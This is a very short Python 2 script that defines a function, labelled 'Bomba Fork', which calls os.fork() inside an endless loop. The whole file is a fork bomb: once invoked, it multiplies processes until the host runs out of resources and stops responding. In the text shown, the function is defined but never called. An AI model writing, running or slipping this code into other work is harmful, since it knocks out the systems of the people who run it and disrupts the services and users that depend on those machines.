import os

def fork():
    print "Bomba Fork"
    while True:
         os.fork()
